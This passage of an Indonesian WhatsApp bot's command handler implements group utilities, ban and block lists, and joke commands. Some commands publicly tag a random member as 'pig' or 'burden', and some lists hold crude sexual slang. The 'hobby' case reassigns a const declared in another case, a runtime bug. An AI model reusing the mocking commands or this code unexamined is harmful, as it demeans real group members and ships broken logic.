			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			setTimeout(() => {
				varo
					.groupLeave(
						from
						)
			}, 2000)
			setTimeout(() => {
				reply(
					'Byee...')
			}, 0)
			break
		case 'online':
		case 'listonline':
		case 'here':
			if (!isGroup)
			return reply(
					`Only Group`
					)
			if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
			try {
				let ido =
					args &&
					/\d+\-\d+@g.us/
					.test(args[
						0]) ?
					args[0] :
					from
				let online = [
					...
					Object
					.keys(
						varo
						.chats
						.get(
							ido
							)
						.presences
						),
					varo
					.user
					.jid
				]
				varo
					.sendMessage(
						from,
						'List Online:\n' +
						online
						.map(
							v =>
							'- @' +
							v
							.replace(
								/@.+/,
								''
								)
							)
						.join `\n`,
						text, {
							quoted: mek,
							contextInfo: {
								mentionedJid: online
							}
						})
			} catch (e) {
				reply(`Error!`)
			}
			break
		case 'hidetag':
			if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			try {
				quotedText = mek
					.message
					.extendedTextMessage
					.contextInfo
					.quotedMessage
					.conversation
				hideTag(from,
					`${quotedText}`
					)
			} catch {
				hideTag(from,
					`${q}`)
			}
			break
		case 'sider':
			if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
			try {
				infom =
					await varo
					.messageInfo(
						from,
						mek
						.message
						.extendedTextMessage
						.contextInfo
						.stanzaId
						)
				tagg = []
				teks =
					`*▷ Dibaca oleh:*\n\n`
				for (let i of
						infom
						.reads) {
					teks +=
						'@' + i
						.jid
						.split(
							'@'
							)[
						0] +
						'\n'
					teks +=
						`> ` +
						moment(
							`${i.t}` *
							1000
							)
						.tz(
							'Asia/Jakarta')
						.format(
							'DD/MM/YYYY HH:mm:ss'
							) +
						'\n\n'
					tagg.push(i
						.jid
						)
				}
				teks +=
					`*▷ Tersampaikan pada:*\n\n`
				for (let i of
						infom
						.deliveries) {
					teks +=
						'@' + i
						.jid
						.split(
							'@'
							)[
						0] +
						'\n'
					teks +=
						`> ` +
						moment(
							`${i.t}` *
							1000
							)
						.tz(
							'Asia/Jakarta')
						.format(
							'DD/MM/YYYY HH:mm:ss'
							) +
						'\n\n'
					tagg.push(i
						.jid
						)
				}
				mentions(teks,
					tagg,
					true)
			} catch (e) {
				console.log(
					color(e)
					)
				reply(
					'Reply chat bot!')
			}
			break
			//------------------< Fun >-------------------
		case 'public':
			if (!mek.key
				.fromMe && !
				isOwner)
			return reply(
					'Fitur Khusus Owner!!'
					)
			if (banChats ===
				false) return
			// var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
			setting.banChats =
				false
			banChats = false
			fs.writeFileSync(
				'./setting.json',
				JSON
				.stringify(
					setting,
					null, 2)
				)
			reply(
				`「 *PUBLIC-MODE* 」`)
			break
		case 'self':
			if (!mek.key
				.fromMe && !
				isOwner)
			return reply(
					'Fitur Khusus Owner!!'
					)
			if (setting
				.banChats ===
				true) return
			setting.banChats =
				true
			uptime = process
				.uptime()
			// var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
			banChats = true
			fs.writeFileSync(
				'./setting.json',
				JSON
				.stringify(
					setting,
					null, 2)
				)
			reply(
				`「 *SELF-MODE* 」`)
			break
		case 'wangy':
			if (isBanned) return reply(mess.baned)
			if (!q) return reply(`Example : ${prefix+command} keqing`)
			qq = q.toUpperCase()
			awikwok =
				`${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
			reply(awikwok)
			break
		case 'mining':
			if (isBanned) return reply(mess.baned)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (isGame(
				sender,
				isPremium,
				gcount,
				glimit))
			return reply(
				`Limit game kamu sudah habis\n\nCek Limit : ${prefix}limitgame`
				)
			var mining =
				randomNomor(
					1000)
			atm.addKoinUser(
				sender,
				mining,
				_uang)
			await reply(
				`*Selamat Kamu Mendapatkan*: _$${mining} 💰_`
				)
				gameAdd(sender,
					glimit)
			break
		case 'waktu':
			if (isBanned) return reply(mess.baned)
			reply(
				`Waktu Indonesia Barat: *${moment().utcOffset('+0700').format('HH:mm')}* WIB \nWaktu Indonesia Tengah: *${moment().utcOffset('+0800').format('HH:mm')}* WITA \nWaktu Indonesia Timur: *${moment().utcOffset('+0900').format('HH:mm')}* WIT`)
			break
		case 'cekmati':
			if (isBanned) return reply(mess.baned)
			if (!q) return reply(`Command untuk cek tanggal kematian seseorang(Only Have Fun)\n\nExample : ${prefix+command} VXROBOT`)
			predea = await axios
				.get(
					`https://api.agify.io/?name=${q}`
					)
			reply(
				`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
			break
		case 'toxic':
			if (isBanned) return reply(mess.baned)
			Toxic().then(
				toxic => {
					reply(
						toxic)
				})
			break
		case 'citacita':
			if (isBanned) return reply(mess.baned)
			const cita = [
				'http://piyobot.000webhostapp.com/citacita1.mp3',
				'http://piyobot.000webhostapp.com/citacita2.mp3',
				'http://piyobot.000webhostapp.com/citacita3.mp3',
				'http://piyobot.000webhostapp.com/citacita4.mp3',
				'http://piyobot.000webhostapp.com/citacita5.mp3',
				'http://piyobot.000webhostapp.com/citacita6.mp3',
				'http://piyobot.000webhostapp.com/citacita7.mp3',
				'http://piyobot.000webhostapp.com/citacita8.mp3',
				'http://piyobot.000webhostapp.com/citacita9.mp3',
				'http://piyobot.000webhostapp.com/citacita10.mp3',
				'http://piyobot.000webhostapp.com/citacita11.mp3',
				'http://piyobot.000webhostapp.com/citacita12.mp3',
				'http://piyobot.000webhostapp.com/citacita13.mp3',
				'http://piyobot.000webhostapp.com/citacita14.mp3',
				'http://piyobot.000webhostapp.com/citacita15.mp3',
				'http://piyobot.000webhostapp.com/citacita16.mp3',
				'http://piyobot.000webhostapp.com/citacita17.mp3',
				'http://piyobot.000webhostapp.com/citacita18.mp3',
				'http://piyobot.000webhostapp.com/citacita19.mp3',
				'http://piyobot.000webhostapp.com/citacita20.mp3',
				'http://piyobot.000webhostapp.com/citacita21.mp3',
				'http://piyobot.000webhostapp.com/citacita22.mp3',
				'http://piyobot.000webhostapp.com/citacita23.mp3',
				'http://piyobot.000webhostapp.com/citacita24.mp3',
				'http://piyobot.000webhostapp.com/citacita25.mp3',
				'http://piyobot.000webhostapp.com/citacita26.mp3',
				'http://piyobot.000webhostapp.com/citacita27.mp3',
				'http://piyobot.000webhostapp.com/citacita28.mp3',
				'http://piyobot.000webhostapp.com/citacita29.mp3',
				'http://piyobot.000webhostapp.com/citacita30.mp3',
				'http://piyobot.000webhostapp.com/citacita31.mp3',
				'http://piyobot.000webhostapp.com/citacita32.mp3',
				'http://piyobot.000webhostapp.com/citacita33.mp3',
				'http://piyobot.000webhostapp.com/citacita34.mp3',
				'http://piyobot.000webhostapp.com/citacita35.mp3'
			]
			const cita3 = cita[
				Math.floor(
					Math
					.random() *
					cita
					.length)
				]
			cita2 =
				await getBuffer(
					cita3)
			varo.sendMessage(
				from, cita2,
				audio, {
					mimetype: 'audio/mp4',
					ptt: true,
					quoted: mek
				})
			break
		case 'apakah':
			if (isBanned) return reply(mess.baned)
			if (!q) return reply(`Command untuk menanyakan pertanyaan ke bot(Only Have Fun)\n\nExample : ${prefix+command} ownerku sudah menikah?`)
			apakah = body.slice(
				1)
			const apa = ['Iya',
				'Tidak',
				'Bisa Jadi',
				'Coba Ulangi'
			]
			const kah = apa[Math
				.floor(Math
					.random() *
					apa
					.length)
				]
			varo.sendMessage(
				from,
				'*Pertanyaan :* ' +
				apakah +
				'\n*Jawaban :* ' +
				kah, text, {
					quoted: mek
				})
			break
		case 'rate':
		case 'nilai':
			if (isBanned) return reply(mess.baned)
			if (!q) return reply(`Command untuk menerima rating dari bot(Only Have Fun)\n\nExample : ${prefix+command} kegantengan ownerku`)
			rate = body.slice(1)
			const ra = ['0',
				'4', '9',
				'17', '28',
				'34', '48',
				'59', '62',
				'74', '83',
				'97', '100',
				'29', '94',
				'75', '82',
				'41', '39'
			]
			const te = ra[Math
				.floor(Math
					.random() *
					ra
					.length)
				]
			varo.sendMessage(
				from,
				'*Pertanyaan :* ' +
				rate +
				'\n*Jawaban :* ' +
				te + '%',
				text, {
					quoted: mek
				})
			break
		case 'gantengcek':
		case 'cekganteng':
			if (isBanned) return reply(mess.baned)
			if (!q) return reply(`Command untuk menerima rating dari bot(Only Have Fun)\n\nExample : ${prefix+command} ownerku`)
			ganteng = body
				.slice(1)
			const gan = ['10',
				'30', '20',
				'40', '50',
				'60', '70',
				'62', '74',
				'83', '97',
				'100', '29',
				'94', '75',
				'82', '41',
				'39'
			]
			const teng = gan[
				Math.floor(
					Math
					.random() *
					gan
					.length)
				]
			varo.sendMessage(
				from,
				'*Pertanyaan :* ' +
				ganteng +
				'\n*Jawaban :* ' +
				teng + '%',
				text, {
					quoted: mek
				})
			break
		case 'cantikcek':
		case 'cekcantik':
			if (isBanned) return reply(mess.baned)
			if (!q) return reply(`Command untuk menerima rating dari bot(Only Have Fun)\n\nExample : ${prefix+command} ownerku`)
			cantik = body.slice(
				1)
			const can = ['10',
				'30', '20',
				'40', '50',
				'60', '70',
				'62', '74',
				'83', '97',
				'100', '29',
				'94', '75',
				'82', '41',
				'39'
			]
			const tik = can[Math
				.floor(Math
					.random() *
					can
					.length)
				]
			varo.sendMessage(
				from,
				'*Pertanyaan :* ' +
				cantik +
				'\n*Jawaban :* ' +
				tik + '%',
				text, {
					quoted: mek
				})
			break
		case 'cekwatak':
			if (isBanned) return reply(mess.baned)
			var namao = pushname
			var prfx =
				await varo
				.getProfilePicture(
					sender)
			const watak = [
				'top deh pokoknya',
				'penyayang',
				'pemurah',
				'Pemarah',
				'Pemaaf',
				'Penurut',
				'Baik',
				'baperan',
				'Baik-Hati',
				'penyabar',
				'UwU',
				'Suka Membantu'
			]
			const wtk = watak[
				Math.floor(
					Math
					.random() *
					(watak
						.length
						))]
			const ratenyaasu = [
				'100%',
				'95%',
				'90%',
				'85%',
				'80%',
				'75%',
				'70%',
				'65%',
				'60%',
				'55%',
				'50%',
				'45%',
				'40%',
				'35%',
				'30%',
				'25%',
				'20%',
				'15%',
				'10%', '5%'
			]
			const akhlak =
				ratenyaasu[Math
					.floor(Math
						.random() *
						(ratenyaasu
							.length
							))]
			const sifat = [
				'Penolong',
				'Suka Membantu',
				'Saling Menolong',
				'Perhatian',
				'Tidak Cuek',
				'Romantis',
				'Dermawan',
				'Cool',
				'Peduli Kepada Sesama',
				'Suka Berkata Kasar'
			]
			const sft = sifat[
				Math.floor(
					Math
					.random() *
					(sifat
						.length
						))]
			const hobby = [
				'Memasak',
				'Membantu Atok',
				'Mabar',
				'Nobar',
				'Coli',
				'Colmek',
				'Sosmedtan',
				'Membantu Orang lain',
				'Nonton Anime',
				'Nonton Drakor',
				'Naik Motor',
				'Nyanyi',
				'Menari',
				'Bertumbuk',
				'Menggambar',
				'Foto fotoan Ga jelas',
				'Maen Game',
				'Berbicara Sendiri'
			]
			const hby = hobby[
				Math.floor(
					Math
					.random() *
					(hobby
						.length
						))]
			const kelebihan = [
				'Soleh dan Soleha',
				'Pintar',
				'Rajin',
				'Teladan'
			]
			const klbh =
				kelebihan[Math
					.floor(Math
						.random() *
						(kelebihan
							.length
							))]
			const tipe = [
				'cool',
				'idaman',
				'Alami',
				'Keren',
				'Ideal',
				'Dia Bamget',
				'normal',
				'elite',
				'epic',
				'Legend'
			]
			const typo = tipe[
				Math.floor(
					Math
					.random() *
					(tipe
						.length
						))]
			await reply(
				`*| CHECKING WATAK |*\n\n Nama :${namao}\n\nWatak:${wtk}\n\nAkhlak:${akhlak}\n\nSifat:${sft}\n\nHobby:${hby}\n\nTipe:${typo}\n\nKelebihan:${klbh}\n\n_Only HaveFun ya... jangan dibawa ke hati._`
				)
			break
		case 'hobby':
			if (isBanned) return reply(mess.baned)
			if (!q) return reply(`Command untuk menerima tebakan hobi dari bot(Only Have Fun)\n\nExample : ${prefix+command} ownerku`)
			hobby = body.slice(
				1)
			const by = hobby[
				Math.floor(
					Math
					.random() *
					hobby
					.length)
				]
			varo.sendMessage(
				from,
				'Pertanyaan : *' +
				hobby +
				'*\n\nJawaban : ' +
				by, text, {
					quoted: mek
				})
			break
		case 'bisakah':
			if (isBanned) return reply(mess.baned)
			if (!q) return reply(`Command untuk menanyakan pertanyaan(Only Have Fun)\n\nExample : ${prefix+command} ownerku menikah?`)
			bisakah = body
				.slice(1)
			const bisa = [
				'Bisa',
				'Tidak Bisa',
				'Coba Ulangi',
				'MANA GW TAU'
			]
			const keh = bisa[
				Math.floor(
					Math
					.random() *
					bisa
					.length)
				]
			varo.sendMessage(
				from,
				'*Pertanyaan :* ' +
				bisakah +
				'\n*Jawaban :* ' +
				keh, text, {
					quoted: mek
				})
			break
		case 'kapankah':
			if (isBanned) return reply(mess.baned)
			if (!q) return reply(`Command untuk menanyakan pertanyaan(Only Have Fun)\n\nExample : ${prefix+command} ownerku menikah?`)
			kapankah = body
				.slice(1)
			const kapan = [
				'Besok',
				'Lusa',
				'Tadi',
				'4 Hari Lagi',
				'5 Hari Lagi',
				'6 Hari Lagi',
				'1 Minggu Lagi',
				'2 Minggu Lagi',
				'3 Minggu Lagi',
				'1 Bulan Lagi',
				'2 Bulan Lagi',
				'3 Bulan Lagi',
				'4 Bulan Lagi',
				'5 Bulan Lagi',
				'6 Bulan Lagi',
				'1 Tahun Lagi',
				'2 Tahun Lagi',
				'3 Tahun Lagi',
				'4 Tahun Lagi',
				'5 Tahun Lagi',
				'6 Tahun Lagi',
				'1 Abad lagi',
				'3 Hari Lagi'
			]
			const koh = kapan[
				Math.floor(
					Math
					.random() *
					kapan
					.length)
				]
			varo.sendMessage(
				from,
				'*Pertanyaan :* ' +
				kapankah +
				'\n*Jawaban :* ' +
				koh, text, {
					quoted: mek
				})
			break
		case 'truth':
			if (isBanned) return reply(mess.baned)
			const trut = [
				'Pernah suka sama siapa aja? berapa lama?',
				'Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)',
				'apa ketakutan terbesar kamu?',
				'pernah suka sama orang dan merasa orang itu suka sama kamu juga?',
				'Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?',
				'pernah gak nyuri uang nyokap atau bokap? Alesanya?',
				'hal yang bikin seneng pas lu lagi sedih apa',
				'pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?',
				'pernah jadi selingkuhan orang?',
				'hal yang paling ditakutin',
				'siapa orang yang paling berpengaruh kepada kehidupanmu',
				'hal membanggakan apa yang kamu dapatkan di tahun ini',
				'siapa orang yang bisa membuatmu sange',
				'siapa orang yang pernah buatmu sange',
				'(bgi yg muslim) pernah ga solat seharian?',
				'Siapa yang paling mendekati tipe pasangan idealmu di sini',
				'suka mabar(main bareng)sama siapa?',
				'pernah nolak orang? alasannya kenapa?',
				'Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget',
				'pencapaian yang udah didapet apa aja ditahun ini?',
				'kebiasaan terburuk lo pas di sekolah apa?'
			]
			const ttrth = trut[
				Math.floor(
					Math
					.random() *
					trut
					.length)
				]
			truteh =
				await getBuffer(
					`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`
					)
			varo.sendMessage(
				from,
				truteh,
				image, {
					caption: '*Truth*\n\n' +
						ttrth,
					quoted: mek
				})
			break
		case 'dare':
			if (isBanned) return reply(mess.baned)
			const dare = [
				'Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu',
				'telfon crush/pacar sekarang dan ss ke pemain',
				'pap ke salah satu anggota grup',
				'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo',
				'ss recent call whatsapp',
				'drop emot "💨" setiap ngetik di gc/pc selama 1 hari',
				'kirim voice note bilang can i call u baby?',
				'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu',
				'pake foto sule sampe 3 hari',
				'ketik pake bahasa daerah 24 jam',
				'ganti nama menjadi "gue anak lucinta luna" selama 5 jam',
				'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you',
				'prank chat mantan dan bilang " i love u, pgn balikan',
				'record voice baca surah al-kautsar',
				'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini',
				'sebutkan tipe pacar mu!',
				'snap/post foto pacar/crush',
				'teriak gajelas lalu kirim pake vn kesini',
				'pap mukamu lalu kirim ke salah satu temanmu',
				'kirim fotomu dengan caption, aku anak pungut',
				'teriak pake kata kasar sambil vn trus kirim kesini',
				'teriak " anjimm gabutt anjimmm " di depan rumah mu',
				'ganti nama jadi " BOWO " selama 24 jam',
				'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll'
			]
			const der = dare[
				Math.floor(
					Math
					.random() *
					dare
					.length)
				]
			buffer =
				await getBuffer(
					`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`
					)
			varo.sendMessage(
				from,
				buffer,
				image, {
					quoted: mek,
					caption: '*Dare*\n\n' +
						der
				})
			break
		case 'jadian':
			if (isBanned) return reply(mess.baned)
			jds = []
			jdii = groupMembers
			koss = groupMembers
			akuu = jdii[Math
				.floor(Math
					.random() *
					jdii
					.length)
				]
			diaa = koss[Math
				.floor(Math
					.random() *
					koss
					.length)
				]
			teks =
				`Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]}  (♥️ ) @${diaa.jid.split('@')[0]} `
			jds.push(akuu.jid)
			jds.push(diaa.jid)
			mentions(teks, jds,
				true)
			break
		case 'cantik':
			if (isBanned) return reply(mess.baned)
			membr = []
			const mes =
				groupMembers
			const msk =
				groupMembers
			const siaps = mes[
				Math.floor(
					Math
					.random() *
					mes
					.length)
				]
			const sips =
				pushname[Math
					.floor(Math
						.random() *
						msk
						.length)
					]
			teks =
				`*Yang Paling Cantik Disini Adalah :* @${siaps.jid.split('@')[0]}`
			membr.push(siaps
				.jid)
			mentions(teks,
				membr, true)
			break
		case 'ganteng':
			if (isBanned) return reply(mess.baned)
			membr = []
			const nus =
				groupMembers
			const msl =
				groupMembers
			const siapss = nus[
				Math.floor(
					Math
					.random() *
					nus
					.length)
				]
			const sipss =
				pushname[Math
					.floor(Math
						.random() *
						msl
						.length)
					]
			teks =
				`*Yang Paling Ganteng Disini Adalah :* @${siapss.jid.split('@')[0]}`
			membr.push(siapss
				.jid)
			mentions(teks,
				membr, true)
			break
		case 'babi':
			if (isBanned) return reply(mess.baned)
			membr = []
			const meg =
				groupMembers
			const mge =
				groupMembers
			const ba = meg[Math
				.floor(Math
					.random() *
					meg
					.length)
				]
			const bi = pushname[
				Math.floor(
					Math
					.random() *
					mge
					.length)
				]
			teks =
				`*Yang Paling Babi Disini Adalah :* @${ba.jid.split('@')[0]}`
			membr.push(ba.jid)
			mentions(teks,
				membr, true)
			break
		case 'beban':
			if (isBanned) return reply(mess.baned)
			membr = []
			const nge =
				groupMembers
			const tod =
				groupMembers
			const beb = nge[Math
				.floor(Math
					.random() *
					nge
					.length)
				]
			const an = pushname[
				Math.floor(
					Math
					.random() *
					tod
					.length)
				]
			teks =
				`*Yang Paling Beban Disini Adalah :* @${beb.jid.split('@')[0]}`
			membr.push(beb.jid)
			mentions(teks,
				membr, true)
			break
			//------------------< Lainnya >-------------------
			case 'addblock': {
				if (!isOwner) return reply(mess.only.owner)
				maublok = args[0].replace('@','')
				await varo.blockUser(`${maublok}@s.whatsapp.net`, "add")
				varo.sendMessage(from, `Succes\nBlock User : @${maublok}`, text, {contextInfo: {mentionedJid:[`${maublok}@s.whatsapp.net`]},quoted:mek})
			}
			break
			case 'delblock': {
				if (!isOwner) return reply(mess.only.owner)
				maublok = args[0].replace('@','')
				await varo.blockUser(`${maublok}@s.whatsapp.net`, "remove")
				varo.sendMessage(from, `Succes\nRemove Block User : @${args[0].replace('@','')}`, text, {contextInfo: {mentionedJid:[`${maublok}@s.whatsapp.net`]},quoted:mek})
			}
			break
			case 'addban':
				if (!q) return reply(`Command untuk menambahkan seseorang ke banlist\n\nExample : ${prefix+command} @6289516998339`)
				if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
				const mauban = body.slice(8).replace('@', '')
				var cekbanned = banned.includes(`${mauban}@s.whatsapp.net`);
					if(cekbanned) {
						return varo.sendMessage(from, { text: `@${mauban}\nSudah terdaftar dalam banlist kami!`, contextInfo: { mentionedJid: [`${mauban}@s.whatsapp.net`]}}, text, {quoted:mek})
					}
for (let i of
						_premium) {
if ((i.id).includes(`${mauban}@s.whatsapp.net`)) return varo.sendMessage(from, `Suatu percubaan yang mantab`, text, {quoted: mek})
}
					banned.push(`${mauban}@s.whatsapp.net`)
					bened.push(`${mauban}`)
					fs.writeFileSync('./database/user/bened.json', JSON.stringify(bened))
					fs.writeFileSync('./database/user/banned.json', JSON.stringify(banned))
					varo.sendMessage(from, { text: `@${mauban}\nAdded to Banlist\n365 days!!`, contextInfo: { mentionedJid: [`${mauban}@s.whatsapp.net`]}}, text, {quoted:mek})
				break
			case 'dellban':
			case 'delban':
				if (!q) return reply(`Command untuk menghapus user dari banlist\n\nExample : ${prefix+command} @6289516998339`)
				if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
				const maudban = args[0].replace('@', '')
				var cekdbanned = banned.includes(`${maudban}@s.whatsapp.net`);
					if(!cekdbanned) {
						return varo.sendMessage(from, { text: `@${maudban}\nBelum terdaftar dalam banlist kami!`, contextInfo: { mentionedJid: [`${maudban}@s.whatsapp.net`]}}, text, {quoted:mek})
					}
					let inz = banned.indexOf(`${maudban}@s.whatsapp.net`)
					let inzasw = banned.indexOf(`${maudban}`)
					bened.splice(inzasw, 1)
					banned.splice(inz, 1)
					fs.writeFileSync('./database/user/bened.json', JSON.stringify(bened))
					fs.writeFileSync('./database/user/banned.json', JSON.stringify(banned))
					varo.sendMessage(from, { text: `@${maudban}\nBerhasil dihapus dari banlist kami!`, contextInfo: { mentionedJid: [`${maudban}@s.whatsapp.net`]}}, text, {quoted:mek})
				break
				case 'banlist':
						case 'listban':
							awiw = bened.length
							tekszz = `*| BANNED LIST |*\n\n*Total : ${awiw}*\n`
							for (let awokw of bened) {
								tekszz += `▷ @${awokw}\n`
							}
							varo.sendMessage(from, `${tekszz.trim()}\n`, extendedText, { quoted: mek, contextInfo: { "mentionedJid": banned } })
							break
		case 'getpp':
		case 'getpic':
			if (isBanned) return reply(mess.baned)
			if (!q) return reply(`Command untuk mendapatkan foto profil seseorang\n\nExample : ${prefix+command} @6289516998339`)
			if (mek.message
				.extendedTextMessage ===
				null || mek
				.message
				.extendedTextMessage ===
				undefined) {
				linkpp =
					await varo
					.getProfilePicture(
						from) ||
					"https://telegra.ph/file/40151a65238ba2643152d.jpg"
				buffer =
					await getBuffer(
						linkpp)
				varo
					.sendMessage(
						from,
						buffer,
						image, {contextInfo: { mentionedJid: [mentioned]},
							caption: `Profile Picture : @${mentioned.split('@')[0]}`,
							quoted: mek
						})
			} else if (mek
				.message
				.extendedTextMessage
				.contextInfo
				.mentionedJid ===
				null || mek
				.message
				.extendedTextMessage
				.contextInfo
				.mentionedJid ===
				undefined) {
				mberr = mek
					.message
					.extendedTextMessage
					.contextInfo
					.participant
				linkpp =
					await varo
					.getProfilePicture(
						mberr
						) ||
					"https://telegra.ph/file/40151a65238ba2643152d.jpg"
				buffer =
					await getBuffer(
						linkpp)
				varo
					.sendMessage(
						from,
						buffer,
						image, {
							quoted: mek,
							caption: `Profile Picture of @${mberr.split("@")[0]}`,
							contextInfo: {
								"mentionedJid": [
									mberr
								]
							}
						})
			} else if (mek
				.message
				.extendedTextMessage
				.contextInfo
				.mentionedJid
				.length > 0) {
				mberr = mek
					.message
					.extendedTextMessage
					.contextInfo
					.mentionedJid[
						0]
				linkpp =
					await varo
					.getProfilePicture(
						mberr
						) ||
					"https://telegra.ph/file/40151a65238ba2643152d.jpg"
				buffer =
					await getBuffer(
						linkpp)
				varo
					.sendMessage(
						from,
						buffer,
						image, {
							quoted: mek,
							caption: `Profile Picture of @${mberr.split("@")[0]}`,
							contextInfo: {
								"mentionedJid": [
									mberr
								]
							}
						})
			}
			break
		case 'd':
		case 'del':
		case 'delete':
			if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
			try {
				if (mek.message
					.extendedTextMessage ===
					undefined ||
					mek.message
					.extendedTextMessage ===
					null)
				return reply(
						'Reply chat bot'
						)
				varo
					.deleteMessage(
						from, {
							id: mek
								.message
								.extendedTextMessage
								.contextInfo
								.stanzaId,
							remoteJid: from,
							fromMe: true
						})
			} catch (e) {
				reply(
					'Reply chat bot')
			}
			break
		case 'tes':
			reply('Okeh nyala')
			break
			case 'saylist':
				case 'listsay':
					if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
					tekszz = `*| SAY LIST |*\n\nKetik *${prefix}say* untuk mendapatkan kata random\n*Total : ${saynye.length}*\n`
					for (let awokwkwkd of saynye) {
						tekszz += `${awokwkwkd}\n`
					}
					reply(tekszz)
					break
		case 'addsay':
				if(args.length < 1) return varo.sendMessage(from, `Fitur untuk menambahkan kata kedalam say list bot\n\nExample :\n${prefix+command} bot`, text, {quoted:mek})
				if (q.length > 29) return reply(`Teks terlalu panjang! maks 29 kata`)
				var ceksay = saynye.includes(`${q}`);
					if(ceksay) {
						return varo.sendMessage(from, `Format Kata:\n${q}\n\nSudah terdaftar dalam Say list kami!`, text, {quoted:mek})
					}
					saynye.push(`${q}`)
					fs.writeFileSync('./database/user/listsay.json', JSON.stringify(saynye))
					varo.sendMessage(from, `Format Kata:\n${q}\n\nAdded to Say list\nType "${prefix}say" for random say`, text, {quoted:mek})
				break
		case 'dellsay':
		case 'delsay':
				if (!mek.key.fromMe && !isPremium) return varo.sendMessage(from, mess.only.premium, text, {quoted:mek})
				if  (args.length < 1) return varo.sendMessage(from, `Fitur untuk menghapus kata dari say list bot\n\nUsage:\n${prefix+command} _text_\n\nEx:\n${prefix+command} bot`, text, {quoted:mek})
				const maudsay = q
				var cekdsay = saynye.includes(`${maudsay}`);
					if(!cekdsay) {
						return varo.sendMessage(from, `Format Kata:\n${maudsay}\n\nBelum terdaftar di say list BOT`, text, {quoted:mek})
					}
					let inzsay = saynye.indexOf(`${maudsay}`)
					saynye.splice(inzsay, 1)
					fs.writeFileSync('./database/user/listsay.json', JSON.stringify(saynye))
					varo.sendMessage(from, `Format Kata:\n${maudsay}\n\nDeleted from Say list`, text, {quoted:mek})
				break
		case 'say':
			sayIndix = Math.floor(Math.random() * saynye.length)
			sayyKiy = saynye[sayIndix]
			reply(sayyKiy)
			break
		case 'info':
		case 'botinfo':
		case 'infobot':
			urlinfo =
				'https://i.ibb.co/2h87z7F/vxrobot.jpg'
			thankslort =
				`*| BOT-INFO |*\n\n▷ Name Bot : VXROBOT\n▷ Owner : @6289516998339\n▷ Battery : 100%/Charging\n▷ Prefix : ${prefix}\n▷ Total Hit : ${totalhit}\n▷ Bot Version : 3.5(2021)\n\n*INDONESIAN TIME*\n- WIB : ${timeWib}\n- WITA : ${timeWita}\n- WIT : ${timeWit}\n- Hari : ${week}\n- Tanggal : ${calender}`
			varo.sendMessage(
				from,
				await getBuffer(
					urlinfo
					),
				image, {contextInfo: {mentionedJid:['6289516998339@s.whatsapp.net']},
					quoted: mek,
					caption: thankslort
				})
			break
			case 'chat':
				if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
				if (args.length < 1)
					return reply(
						`Command untuk mengirim pesan via bot\n\nExample : ${prefix + command} 628xx|Halo`
						)
